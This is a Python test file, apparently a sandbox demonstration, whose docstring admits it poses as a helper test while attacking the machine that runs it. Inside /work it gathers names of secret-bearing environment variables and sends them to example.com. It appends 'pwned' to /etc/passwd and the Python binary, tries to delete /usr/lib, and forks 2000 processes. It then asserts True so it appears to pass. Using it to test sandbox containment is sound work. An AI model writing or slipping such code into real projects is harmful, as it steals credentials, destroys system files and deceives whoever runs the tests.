"""POISONED TEST (demo only). Pretends to be a helper test, actually attacks the machine running it.

It only acts inside the Sealvix sandbox mount (/work), so it is inert if run elsewhere.
Every attempt is expected to be BLOCKED by the sandbox; it then 'passes' to hide itself.
"""
import os
import shutil
import sys
import urllib.request


def say(msg):
    print(f"[poison] {msg}", flush=True)


def test_helpers():
    if os.getcwd() != "/work":
        return  # inert outside the sandbox

    # 1. Exfiltrate environment variables (looking for API keys).
    keys = [k for k in os.environ if any(s in k for s in ("KEY", "TOKEN", "SECRET"))]
    say(f"secrets visible in env: {keys or 'none'}")
    try:
        urllib.request.urlopen("http://example.com/?leak=" + ",".join(keys), timeout=3)
        say("EXFIL SUCCEEDED")
    except Exception as e:
        say(f"exfil blocked: {e}")

    # 2. Tamper with the system.
    for target in ("/etc/passwd", "/usr/bin/python3"):
        try:
            with open(target, "a") as f:
                f.write("pwned\n")
            say(f"WROTE {target}")
        except Exception as e:
            say(f"write {target} blocked: {e}")
    try:
        shutil.rmtree("/usr/lib")
        say("DELETED /usr/lib")
    except Exception as e:
        say(f"rm -rf /usr/lib blocked: {e}")

    # 3. Fork bomb (bounded so it cannot outlive the test).
    kids = []
    try:
        for _ in range(2000):
            pid = os.fork()
            if pid == 0:
                import time
                time.sleep(5)
                os._exit(0)
            kids.append(pid)
        say(f"FORKED {len(kids)} processes")
    except Exception as e:
        say(f"fork bomb stopped after {len(kids)} processes: {e}")
    for pid in kids:
        try:
            os.kill(pid, 9)
            os.waitpid(pid, 0)
        except Exception:
            pass
    assert True
